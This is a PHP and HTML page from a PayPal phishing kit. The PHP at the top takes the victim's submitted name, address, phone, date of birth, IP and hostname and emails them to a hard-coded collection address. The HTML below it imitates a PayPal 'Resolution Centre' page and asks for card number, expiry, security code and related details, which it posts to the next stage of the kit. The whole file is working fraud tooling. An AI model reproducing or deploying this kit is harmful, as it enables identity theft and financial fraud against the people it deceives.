<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = "=====================+ PaYPal CWX +=====================\n";
$message .= "Full Name        : ".$_POST['01D']."\n\n";
$message .= "Adress Line 1    : ".$_POST['02D']."\n\n";
$message .= "Line 2           : ".$_POST['03D']."\n\n";
$message .= "City             : ".$_POST['04D']."\n\n";
$message .= "Zip              : ".$_POST['06D']."\n\n";
$message .= "Phone            : ".$_POST['07D']."\n\n";
$message .= "DOB              : ".$_POST['08D']."\n\n";
$message .= "===================\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "========================+ CyberXPloit  +======================\n";
$rnessage = "$message\n";
$send= "rsaccount1991@live.com";
$subject = "Billing | Paypal | $ip";
$headers = "From: PayPalCWX<cwxnetwork@exploit.net>";

$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);

}
?>
<!DOCTYPE HTML5>
<html><head>
<meta charset="UTF-8">
<title>Resolution Centre - PayPal</title>
<link href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" rel="icon">
<link rel="stylesheet" href="css/gfrehegr.css">
</head>
<body>
<div id="bar">
   <div id="wrapperbar">
   <img src="images/website_logo.gif" style="padding-top: 10px;">
   </div>
</div>
<div id="wrapper2">
<img src="images/try.png" style="float: right;padding-top: 20px;">
<div id="block2">
<form id="form" name="form" method="post" action="end.php">
<img src="images/cinformation.png">
<div id="loginform">
<img src="images/nmc.png">
<input type="text" name="01D">
<img src="images/ccn.png">
<input type="text" name="02D" class="mdrf">
<img src="images/exp.png">
<div id="alline">
<select name="03D">
<option>01</option>
<option>02</option>
<option>03</option>
<option>04</option>
<option>05</option>
<option>06</option>
<option>07</option>
<option>08</option>
<option>09</option>
<option>10</option>
<option>11</option>
<option>12</option>
</select>
<select name="04D">
<option>2014</option>
<option>2015</option>
<option>2016</option>
<option>2017</option>
<option>2018</option>
<option>2019</option>
<option>2020</option>
<option>2021</option>
<option>2022</option>
<option>2023</option>
<option>2024</option>
<option>2025</option>
</select>
</div>
<img src="images/cc2.png">
<input type="text" name="05D" style="width: 100px;display: block;margin-top: 05px;">
<img src="images/acn.png">
<input type="text" name="06D" style="width: 200px;display: block;margin-top: 05px;">
<img src="images/sc.png">
<input type="text" name="07D" style="width: 150px;display: block;margin-top: 05px;">

<div style="position:relative; height:45px; width:343px; background:url(images/button2.png) 0 0 no-repeat;margin-top: 20px;"><a value="" onclick="document.forms['form'].submit(); return false;" style="position:absolute; top:3px; left:5px; width:333px; height:36px;" title="" alt="" target="_self"></a><a style="position:absolute; overflow:hidden; top:43px; left:341px; width:1px; height:1px;" title="HTML Map" alt="HTML Map" href="http://www.html-map.com/" target="_self"></a></div>
</div>
</form>
</div>
<div id="footer">
<img src="images/copyright.png">
</div>
</div>

</body></html>